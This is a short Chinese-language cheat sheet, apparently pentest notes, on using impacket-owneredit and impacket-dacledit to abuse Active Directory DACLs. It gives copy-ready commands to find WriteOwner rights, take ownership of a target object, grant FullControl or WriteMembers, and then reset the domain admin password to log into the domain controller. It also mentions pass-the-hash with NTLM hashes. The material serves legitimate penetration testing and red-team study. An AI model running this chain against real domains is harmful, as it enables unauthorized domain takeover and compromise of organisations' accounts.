# impacket-owneredit

## 介绍

impacket-owneredit主要用来读取和修改Active Directory对象的所有者（owner）信息。这在域权限提升（Domain Privilege Escalation）场景非常有用，例如有WriteOwener权限的时，可以将对象的所有者改为自己控制的账户，从而进一步滥用权限（例如授予GenricAll等权限）

DACL（Discretionary Access Control List）滥用攻击链，与dacledit工具结合使用。

## 关键参数

| 参数                               | 意思                                                         |
| ---------------------------------- | ------------------------------------------------------------ |
| -dc-ip <DC_IP>或-dc-host <DC_HOST> | 指定域控制器的IP和主机名                                     |
| -action read/write                 | 操作类型 （读取/修改）                                       |
| -target <TARGET_OBJECT>            | 目标对象，可以是用户名（SAMAccountName）、SID或者DN（用户、组、计算机对象） |
| -new-owner <NEW_OWNER>             | 当action为write时，指定新所有者（可以是SID或者用户名）       |
| <DOMAIN/USERNAME:PASSWORD>         | 域账户凭证格式（如果有NTLM哈希，用-hashes LMHASH:NTHASH）    |
| -debug                             | 启动调试模式，输出更多细节                                   |
| -hashes <LMHASH:NTHASH>            | 用NTLM哈希代替密码（PTH）                                    |

owneredit.py [-dc-ip <DC_IP> | -dc-host <DC_HOST>] -action <read|write> -target <TARGET_OBJECT> [其他选项] <DOMAIN/USERNAME:PASSWORD>

## 使用方法

### 1）侦察阶段（Reconnaissance）

（1）查WriteOwner权限：

​	Get-ObjectAcl -Identity <TARGET_USER> | ? {$_.ActiveDirectoryRights -match "WriteOwner"}

（2）用owneredit读取当前所有者

​	impacket-owneredit -dc-ip 10.10.10.100 -action read -target "targetuser" DOMAIN/user:password

### 2）利用阶段（Exploitation）

（1）如果有WriteOwner权限：

​	impacket-owneredit -dc-ip 10.10.10.100 -action write -target "targetuser" -new-owner "S-1-5-21-...-512" DOMAIN/user:password

（2）给自己赋予GenericAll权限

​	全部权限

​	impacket-dacledit -dc-ip 10.10.10.100 -action write -rights FullControl -principal "youruser" -target "targetuser" DOMAIN/user:password

​	WriteMembers权限

​	impacket-dacledit -dc-ip 10.10.10.100 -action write -rights WriteMembers -principal "youruser" -target "targetuser" DOMAIN/user:password

### 3）权限提升（Privilege Escalation）

读取所有者 → 修改所有者 → 授予权限 → 重置域管理员密码 → 登录 DC。